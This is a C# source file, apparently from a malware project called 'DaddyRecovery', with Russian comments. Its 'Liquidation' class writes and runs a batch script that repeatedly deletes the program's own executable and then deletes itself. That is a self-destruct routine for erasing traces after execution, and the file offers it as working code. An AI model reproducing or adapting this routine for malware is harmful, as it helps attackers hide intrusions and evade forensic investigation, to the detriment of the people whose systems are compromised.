namespace DaddyRecovery.Sticks
{
    using System;
    using System.IO;
    using System.Text;
    using Helpers;

    public static class Liquidation
    {
        public static void Inizialize(string pathfile)
        {
            try
            {
                using (var sw = new StreamWriter(pathfile))
                {
                    sw.WriteLine("@echo off"); // Переключение режима отображения команд на экране
                    sw.WriteLine(":loop"); // запускаем цикл
                    sw.WriteLine(string.Concat("del \"", GlobalPath.GetFileName, "\"")); // Удаляем файл
                    sw.WriteLine(string.Concat("if Exist \"", GlobalPath.GetFileName, "\" GOTO loop")); // Проверяем файл и возвращяемся в цикл для проверки снова
                    sw.WriteLine("del %0"); // После удаляем .bat файл
                    sw.Flush();
                }
            }
            catch { }

            if (CombineEx.ExistsFile(pathfile))
            {
                ProcessControl.RunFile(pathfile);
            }
        }
    }
}